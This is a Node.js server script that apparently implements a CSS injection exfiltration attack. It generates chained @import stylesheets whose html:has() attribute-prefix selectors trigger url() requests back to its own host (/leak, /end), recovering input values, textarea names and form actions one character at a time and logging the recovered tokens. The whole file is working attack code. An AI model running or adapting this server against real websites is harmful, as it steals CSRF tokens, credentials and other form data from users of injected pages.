const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const ELEMENTS = ["input","textarea","form"];
const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
const MAX_ELEMENTS = 1;
const MAX_VALUE = 50;
const WAIT_TIME_MS = 250;

const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126).split('');

var pending = [];
var stop = false, n = 0, prefixes = {__proto__:null};
var tokens = [], foundToken = false;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    if (stop) {
        completed();
        return response.end();
    }
    switch (req.pathname) {
        case "/start":
            n = 0;
            tokens = [];
            prefixes = {__proto__:null};
            stop = false;        
            pending = [];
            foundToken = false;
            genResponse(response);
        break;
        case "/leak":
            response.end();
            for(let element of ELEMENTS) {
                for(let attribute of ATTRIBUTES[element]) { 
                    for(let i=0;i<MAX_ELEMENTS;i++) {  
                        if(n === +req.query.n) {
                            if(typeof req.query['p_'+element+attribute+i] !== 'undefined') {
                                if(typeof prefixes['p_'+element+attribute+i] === 'undefined') {
                                    prefixes['p_'+element+attribute+i] = '';
                                } 
                                prefixes['p_'+element+attribute+i] = req.query['p_'+element+attribute+i];
                                foundToken = true;
                            }
                        }
                    }
                }
            }
            //console.log('\tleak: waiting others...');   
        break;
        case "/next":
            pending.push(response);            
            //console.log('\tquery: waiting others...');
            setTimeout(x=>{            
                if(pending.length) {
                    if(foundToken) {
                        n++;
                        genResponse(pending.shift());          
                        foundToken = false;
                    } else {
                        stop = true;
                        completed();
                    }
                }            
            }, WAIT_TIME_MS);
        break;
        case "/end":   
            let tokenName = req.query.tokenName;
            let tokenValue = req.query.tokenValue;
            if(!hasToken(tokenName,tokenValue)) {
                tokens.push({tokenName, tokenValue});
            }
            if(stop) {
                completed();
                response.end();   
            }
        default:
            response.end();
    }
}

const genResponse = (response) => {
    let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
    let properties = [];
    for(let element of ELEMENTS) {
        for(let attribute of ATTRIBUTES[element]) { 
            for(let i=0;i<MAX_ELEMENTS;i++) {          
                const variablePrefix = '--'+element+'-'+attribute+'-'+i+'-'+n;  
                if(typeof prefixes['p_'+element+attribute+i] === 'undefined') {
                    prefixes['p_'+element+attribute+i] = '';
                }
                const prefix = prefixes['p_'+element+attribute+i];
                css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"])' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/leak?t='+Date.now()+'&n='+n+'&p_'+element+attribute+i+'=' + encodeURIComponent(prefix + e) +');}')).join('');                                        
                css += 'html:has(['+attribute+'="'+ prefix + '"]){'+variablePrefix+'full-token:url(' + HOSTNAME + '/end?tokenName='+element+attribute+i+'&tokenValue=' + encodeURIComponent(prefix) + ');}';            
            }
        }
    }
    if(n === 0) {  
        for(let element of ELEMENTS) {
            for(let attribute of ATTRIBUTES[element]) {         
                for(let i=0;i<MAX_ELEMENTS;i++) { 
                    for(let j=0;j<MAX_VALUE;j++) {         
                        const variablePrefix = '--'+element+'-'+attribute+'-'+i+'-'+j;  
                        properties.push('var('+variablePrefix+'s,none)');              
                        properties.push('var('+variablePrefix+'full-token,none)');  
                    }
                }
            }
        }
        css += `html{background:${properties.join(',')};}`;
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function escapeCSS(str) {
    return str.replace(/(["\\])/,'\\$1');
}

function hasToken(tokenName, tokenValue) {
    return tokens.find(tokenObject => tokenName === tokenObject.tokenName && tokenValue === tokenObject.tokenValue);
}

function completed() {
    console.log("Completed.", tokens);
}